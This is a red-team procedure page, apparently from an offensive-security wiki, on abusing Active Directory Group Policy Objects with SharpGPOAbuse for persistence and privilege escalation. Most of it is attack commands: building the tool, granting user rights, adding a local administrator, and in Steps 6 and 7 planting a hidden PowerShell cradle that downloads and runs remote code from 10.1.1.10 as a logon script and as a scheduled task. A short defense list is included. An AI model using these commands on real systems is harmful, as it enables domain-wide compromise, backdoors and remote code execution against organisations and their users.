---
type: procedure
description: >-
  Modify or create Group Policy Objects using SharpGPOAbuse to achieve
  persistence, privilege escalation, and lateral movement in Active Directory
  environments.
verified: true
submitted: false
created_at: '2023-04-06T03:56:03Z'
updated_at: '2023-04-10T20:36:12Z'
tactics:
  - '[[Persistence]]'
  - '[[Privilege Escalation]]'
techniques:
  - '[[Group Policy Modification]]'
  - '[[Scheduled Task]]'
sub_techniques: []
tags:
  - gpo-abuse
  - active-directory
  - sharp-gpo-abuse
  - persistence
  - privilege-escalation
commands:
  - '[[commands/clone-sharpgpoabuse-repo]]'
  - '[[commands/install-commandlineparser-nuget]]'
  - '[[commands/ilmerge-sharpgpoabuse]]'
  - '[[commands/sharpgpoabuse-add-user-rights]]'
  - '[[commands/sharpgpoabuse-add-local-admin]]'
  - '[[commands/sharpgpoabuse-add-user-script]]'
  - '[[commands/sharpgpoabuse-add-computer-task]]'
platforms:
  - Windows
tools:
  - '[[tools/SharpGPOAbuse]]'
validated: true
---

# Abuse-Group-Policy-Objects-with-SharpGPOAbuse

## Summary

This procedure details how to use SharpGPOAbuse, a C# tool, to abuse Group Policy Objects (GPOs) in Active Directory for persistence, privilege escalation, and lateral movement. By modifying existing GPOs or creating new ones, attackers can add user rights, create local admins, inject scripts, or schedule tasks that execute arbitrary code on domain-joined systems during GPO refresh cycles.

## Description

Group Policy Objects control security settings and configurations across Active Directory domains. Attackers with domain admin privileges can exploit GPOs to deploy malicious scripts, tasks, or account modifications that propagate to targeted machines. SharpGPOAbuse automates this by interfacing with the Group Policy Management Console APIs to alter GPO contents without direct GUI interaction. This technique is effective in enterprise Windows environments for maintaining long-term access or elevating privileges undetected. Prerequisites include domain admin credentials, as GPO modifications require elevated permissions on a domain controller or equivalent access.

## Requirements

1. Domain administrator account or equivalent privileges on a domain controller.
2. Access to a Windows machine with .NET development tools (for building SharpGPOAbuse).
3. Network connectivity to the domain controller hosting the GPOs.
4. Git, NuGet, and ILMerge installed for tool setup.

## Defense

- Restrict domain admin accounts to just-in-time access and monitor their usage via auditing.
- Enable Group Policy auditing to log modifications to GPOs.
- Implement least privilege for service accounts and regularly review GPO contents for anomalies.
- Use tools like Microsoft Advanced Group Policy Management (AGPM) for change control and approval workflows.

## Objectives

1. Establish persistence by injecting scripts or tasks into GPOs that execute on target systems.
2. Escalate privileges by adding users to local admin groups or granting specific rights via GPO.
3. Enable lateral movement by creating backdoor accounts or scheduled jobs that facilitate further access.

## Instructions

### Step 1: Clone the SharpGPOAbuse Repository

**Context**: Download the source code of SharpGPOAbuse to prepare for building the executable. This step ensures you have the latest version of the tool.

**Command** ([[commands/clone-sharpgpoabuse-repo]]):
```powershell
git clone https://github.com/FSecureLABS/SharpGPOAbuse
```

> This clones the repository into a local directory. Expected output includes progress messages ending with 'Cloning into 'SharpGPOAbuse'...'. Verify by checking for the SharpGPOAbuse folder containing .csproj and source files.

### Step 2: Install the CommandLineParser NuGet Package

**Context**: SharpGPOAbuse depends on the CommandLineParser library for argument parsing. Installing this package resolves dependencies before building.

**Command** ([[commands/install-commandlineparser-nuget]]):
```powershell
Install-Package CommandLineParser -Version 1.9.3.15
```

> Run this in the Package Manager Console (in Visual Studio) or via NuGet CLI after building the project. Expected output confirms package installation. This step is necessary to avoid runtime errors when executing the tool.

### Step 3: Merge Assemblies with ILMerge

**Context**: Combine the SharpGPOAbuse executable with the CommandLineParser DLL into a single file for easier deployment and execution without dependency issues.

**Command** ([[commands/ilmerge-sharpgpoabuse]]):
```powershell
ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\CommandLine.dll
```

> Assumes the project is built in Release mode to C:\Release. Expected output is a success message or the merged executable created at the specified path. Test by running the exe with --help to confirm functionality.

### Step 4: Add User Rights to a GPO

**Context**: Grant specific privileges (e.g., SeTakeOwnershipPrivilege) to a user via GPO modification, enabling escalation on affected systems.

**Command** ([[commands/sharpgpoabuse-add-user-rights]]):
```powershell
.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"
```

> This modifies the specified GPO to assign the rights to the user. Expected output confirms the update. The change applies on next GPO refresh, allowing the user elevated actions on domain machines.

### Step 5: Add Local Admin via GPO

**Context**: Configure the GPO to add a user to the local Administrators group on targeted computers, facilitating privilege escalation.

**Command** ([[commands/sharpgpoabuse-add-local-admin]]):
```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
```

> Targets computers linked to the GPO. Expected output indicates successful GPO update. Verify by checking the GPO's security settings in Group Policy Management Console.

### Step 6: Add User Logon Script to GPO

**Context**: Inject a malicious script into the GPO that runs at user logon, enabling code execution for persistence or payload delivery.

**Command** ([[commands/sharpgpoabuse-add-user-script]]):
```powershell
.\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
```

> The script contents download and execute remote PowerShell code. Expected output confirms script addition. This runs hidden at logon for affected users.

### Step 7: Add Scheduled Task to GPO

**Context**: Create an immediate scheduled task in the GPO that executes once per refresh, useful for one-time or recurring payload deployment.

**Command** ([[commands/sharpgpoabuse-add-computer-task]]):
```powershell
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
```

> Note: Tasks run per GPO refresh, not once per system. Expected output shows task creation. Monitor Task Scheduler on targets for the new task after refresh.
